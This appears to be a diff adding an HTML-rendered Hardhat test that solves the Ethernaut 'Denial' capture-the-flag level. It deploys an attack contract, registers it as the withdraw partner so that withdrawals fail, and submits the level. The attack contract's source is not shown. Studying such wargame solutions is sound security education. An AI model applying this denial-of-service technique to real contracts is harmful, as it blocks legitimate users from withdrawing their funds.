@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+  <title>20_Denial.ts</title>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <link rel="stylesheet" media="all" href="../public/stylesheets/normalize.css" />
+  <link rel="stylesheet" media="all" href="../docco.css" />
+</head>
+<body>
+  <div class="container">
+    <div class="page">
+
+      <div class="header">
+        <h1>20_Denial.ts</h1>
+
+        
+      </div>
+      
+        
+        
+        <div class='highlight'><pre><span class="hljs-keyword">import</span> {ethers} <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;hardhat&#x27;</span>
+<span class="hljs-keyword">import</span> {<span class="hljs-title class_">BigNumber</span>, <span class="hljs-title class_">Contract</span>, providers, <span class="hljs-title class_">Signer</span>} <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;ethers&#x27;</span>
+
+<span class="hljs-keyword">import</span> {<span class="hljs-variable constant_">ETHERNAUT_ADDRESS</span>, expect, expectStatusFail, expectStatusOK} <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./testUtil&#x27;</span>
+
+<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">LEVEL_ADDRESS</span> = <span class="hljs-string">&#x27;0xcE1BB92eeb71AF5Fec09D38B0c854d55285f6e04&#x27;</span>
+<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">INSTANCE_ADDRESS</span> = <span class="hljs-string">&#x27;0x6118EFF4b502DAcf0CCc0e98644831de0f339066&#x27;</span>
+
+<span class="hljs-title function_">describe</span>(<span class="hljs-string">&#x27;20 Denial&#x27;</span>, <span class="hljs-function">() =&gt;</span> {
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">ethernaut</span>: <span class="hljs-title class_">Contract</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">instance</span>: <span class="hljs-title class_">Contract</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">attack</span>: <span class="hljs-title class_">Contract</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">signer</span>: <span class="hljs-title class_">Signer</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">signerAddress</span>: <span class="hljs-built_in">string</span>
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">provider</span>: providers.<span class="hljs-property">Provider</span>
+
+  <span class="hljs-keyword">let</span> <span class="hljs-attr">instanceBalance</span>: <span class="hljs-title class_">BigNumber</span>
+
+  <span class="hljs-title function_">before</span>(<span class="hljs-keyword">async</span> () =&gt; {
+    ethernaut = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractAt</span>(<span class="hljs-string">&#x27;Ethernaut&#x27;</span>, <span class="hljs-variable constant_">ETHERNAUT_ADDRESS</span>)
+    instance = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractAt</span>(<span class="hljs-string">&#x27;Denial&#x27;</span>, <span class="hljs-variable constant_">INSTANCE_ADDRESS</span>)
+
+    <span class="hljs-keyword">const</span> factory = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractFactory</span>(<span class="hljs-string">&#x27;DenialAttack&#x27;</span>)
+    attack = <span class="hljs-keyword">await</span> factory.<span class="hljs-title function_">deploy</span>()
+    <span class="hljs-keyword">await</span> attack.<span class="hljs-property">deployTransaction</span>.<span class="hljs-title function_">wait</span>()
+
+    <span class="hljs-keyword">const</span> signers = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getSigners</span>()
+    signer = signers[<span class="hljs-number">0</span>]
+    signerAddress = <span class="hljs-keyword">await</span> signer.<span class="hljs-title function_">getAddress</span>()
+    provider = signer.<span class="hljs-property">provider</span>
+  })
+
+  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;sets attack contract as withdraw partner&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; {
+      <span class="hljs-keyword">const</span> tx = <span class="hljs-keyword">await</span> instance.<span class="hljs-title function_">setWithdrawPartner</span>(attack.<span class="hljs-property">address</span>)
+      <span class="hljs-keyword">await</span> tx.<span class="hljs-title function_">wait</span>()
+      <span class="hljs-title function_">expect</span>(<span class="hljs-keyword">await</span> instance.<span class="hljs-title function_">partner</span>()).<span class="hljs-property">to</span>.<span class="hljs-title function_">eq</span>(attack.<span class="hljs-property">address</span>)
+  })
+
+  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;verifies withdraw fails&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; {
+      instanceBalance = <span class="hljs-keyword">await</span> provider.<span class="hljs-title function_">getBalance</span>(instance.<span class="hljs-property">address</span>)
+      <span class="hljs-keyword">const</span> tx = <span class="hljs-keyword">await</span> instance.<span class="hljs-title function_">withdraw</span>({ <span class="hljs-attr">gasLimit</span>: <span class="hljs-number">500000</span> })
+      <span class="hljs-keyword">return</span> <span class="hljs-title function_">expectStatusFail</span>(tx)
+  })
+
+  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;verifies instance balance has not decreased&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; {
+      <span class="hljs-keyword">const</span> newInstanceBalance = <span class="hljs-keyword">await</span> provider.<span class="hljs-title function_">getBalance</span>(instance.<span class="hljs-property">address</span>)
+      <span class="hljs-title function_">expect</span>(newInstanceBalance).<span class="hljs-property">to</span>.<span class="hljs-title function_">eq</span>(instanceBalance)
+  })
+
+  <span class="hljs-title function_">it</span>(<span class="hljs-string">&#x27;is validated&#x27;</span>, <span class="hljs-keyword">async</span> () =&gt; {
+    <span class="hljs-keyword">return</span> <span class="hljs-title function_">expect</span>(ethernaut.<span class="hljs-title function_">submitLevelInstance</span>(instance.<span class="hljs-property">address</span>))
+      .<span class="hljs-property">to</span>.<span class="hljs-title function_">emit</span>(ethernaut, <span class="hljs-string">&#x27;LevelCompletedLog&#x27;</span>)
+      .<span class="hljs-title function_">withArgs</span>(signerAddress, <span class="hljs-variable constant_">LEVEL_ADDRESS</span>).<span class="hljs-property">eventually</span>
+  })
+})</pre></div>
+      
+    </div>
+  </div>
+</body>
+</html>
